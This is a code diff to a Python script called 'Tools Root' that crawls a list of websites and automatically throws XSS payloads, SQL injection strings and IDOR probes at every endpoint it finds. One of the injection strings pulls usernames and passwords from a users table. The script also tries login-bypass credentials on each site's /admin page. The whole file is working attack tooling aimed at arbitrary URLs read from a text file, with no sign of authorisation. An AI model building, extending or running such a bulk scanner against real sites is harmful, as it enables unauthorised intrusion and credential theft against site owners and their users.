@@ -1,5 +1,5 @@
 import requests
-import os
+from bs4 import BeautifulSoup
 import pandas as pd
 from colorama import Fore, init
 from tqdm import tqdm
@@ -8,42 +8,69 @@ import pyfiglet
 init(autoreset=True)
 
 # Payloads for vulnerabilities
-xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
-sql_payloads = ["' OR 1=1 --", '" OR "a"="a', "' UNION SELECT NULL, NULL --"]
-idor_user_ids = [1, 2, 3, 999]
+xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>", "<body onload=alert('XSS')>"]
+sql_payloads = ["' OR 1=1 --", "' AND 1=2 UNION SELECT NULL,NULL --", "' UNION SELECT username, password FROM users --"]
+idor_user_ids = [1, 2, 999, 1000]
 bypass_payloads = [
     {"username": "' OR 1=1 --", "password": "any"},
     {"username": "admin", "password": "' OR '1'='1"},
     {"username": "root", "password": "' UNION SELECT 1,2,3 --"}
 ]
 
+# Parameters to test
+test_parameters = ["id", "user", "page", "search", "query", "product"]
+
+# Crawl website for endpoints
+def crawl_website(base_url):
+    visited = set()
+    endpoints = set()
+    try:
+        response = requests.get(base_url, timeout=10)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        for link in soup.find_all('a', href=True):
+            href = link['href']
+            if href.startswith('/'):
+                full_url = base_url.rstrip('/') + href
+                if full_url not in visited:
+                    visited.add(full_url)
+                    endpoints.add(full_url)
+            elif base_url in href:
+                if href not in visited:
+                    visited.add(href)
+                    endpoints.add(href)
+    except requests.exceptions.RequestException:
+        pass
+    return endpoints
+
 # Vulnerability scan functions
 def scan_xss(url):
     results = []
-    for payload in xss_payloads:
-        try:
-            response = requests.get(f"{url}?q={payload}", timeout=10)
-            if payload in response.text:
-                results.append({"Path": f"{url}?q={payload}", "Payload": payload})
-        except requests.exceptions.RequestException:
-            continue
+    for param in test_parameters:
+        for payload in xss_payloads:
+            try:
+                response = requests.get(url, params={param: payload}, timeout=10)
+                if payload in response.text:
+                    results.append({"Path": url, "Parameter": param, "Payload": payload})
+            except requests.exceptions.RequestException:
+                continue
     return results
 
 def scan_sql_injection(url):
     results = []
-    for payload in sql_payloads:
-        try:
-            response = requests.get(f"{url}?id={payload}", timeout=10)
-            if "syntax" in response.text.lower() or "mysql" in response.text.lower():
-                results.append({"Path": f"{url}?id={payload}", "Payload": payload})
-        except requests.exceptions.RequestException:
-            continue
+    for param in test_parameters:
+        for payload in sql_payloads:
+            try:
+                response = requests.get(url, params={param: payload}, timeout=10)
+                if "syntax" in response.text.lower() or "mysql" in response.text.lower() or "error" in response.text.lower():
+                    results.append({"Path": url, "Parameter": param, "Payload": payload})
+            except requests.exceptions.RequestException:
+                continue
     return results
 
 def scan_idor(url):
     results = []
     for user_id in idor_user_ids:
-        path = f"{url}/profile/{user_id}"
+        path = f"{url}/{user_id}"
         try:
             response = requests.get(path, timeout=10)
             if response.status_code == 200 and "user" in response.text.lower():
@@ -64,29 +91,25 @@ def bypass_admin_panel(admin_url):
             continue
     return results
 
-# Discover admin panel and scan bypass
-def discover_and_bypass_admin(url):
-    admin_url = f"{url}/admin"
-    try:
-        response = requests.get(admin_url, timeout=10)
-        if response.status_code == 200 and "login" in response.text.lower():
-            return bypass_admin_panel(admin_url)
-    except requests.exceptions.RequestException:
-        pass
-    return []
-
 # Main scan function
-def scan_site(url):
-    xss_results = scan_xss(url)
-    sql_results = scan_sql_injection(url)
-    idor_results = scan_idor(url)
-    bypass_results = discover_and_bypass_admin(url)
-    return {
-        "XSS": xss_results,
-        "SQL Injection": sql_results,
-        "IDOR": idor_results,
-        "Admin Bypass": bypass_results
-    }
+def scan_site(base_url):
+    endpoints = crawl_website(base_url)
+    vulnerabilities = {"XSS": [], "SQL Injection": [], "IDOR": [], "Admin Bypass": []}
+
+    for endpoint in tqdm(endpoints, desc=f"Scanning {base_url}", ncols=100):
+        # XSS Scan
+        vulnerabilities["XSS"].extend(scan_xss(endpoint))
+        # SQL Injection Scan
+        vulnerabilities["SQL Injection"].extend(scan_sql_injection(endpoint))
+        # IDOR Scan
+        vulnerabilities["IDOR"].extend(scan_idor(endpoint))
+
+    # Admin Bypass
+    admin_results = bypass_admin_panel(f"{base_url}/admin")
+    if admin_results:
+        vulnerabilities["Admin Bypass"].extend(admin_results)
+
+    return vulnerabilities
 
 # Display results in separate tables
 def display_results(all_results):
@@ -103,16 +126,21 @@ def main():
     print(Fore.CYAN + pyfiglet.figlet_format("Tools Root", font="slant"))
     filename = input(Fore.CYAN + "Enter the file containing URLs (e.g., list.txt): ")
 
-    if not os.path.exists(filename):
+    if not filename or not filename.endswith('.txt'):
+        print(Fore.RED + "Invalid file format. Please provide a .txt file.")
+        return
+
+    try:
+        with open(filename, 'r') as file:
+            urls = [line.strip() for line in file.readlines()]
+    except FileNotFoundError:
         print(Fore.RED + f"File '{filename}' not found.")
         return
 
-    with open(filename, 'r') as file:
-        urls = [line.strip() for line in file.readlines()]
-
     all_vulnerabilities = {"XSS": [], "SQL Injection": [], "IDOR": [], "Admin Bypass": []}
-    for url in tqdm(urls, desc="Scanning Sites", ncols=100):
-        site_results = scan_site(url)
+
+    for base_url in urls:
+        site_results = scan_site(base_url)
         for vuln_type, results in site_results.items():
             all_vulnerabilities[vuln_type].extend(results)
 
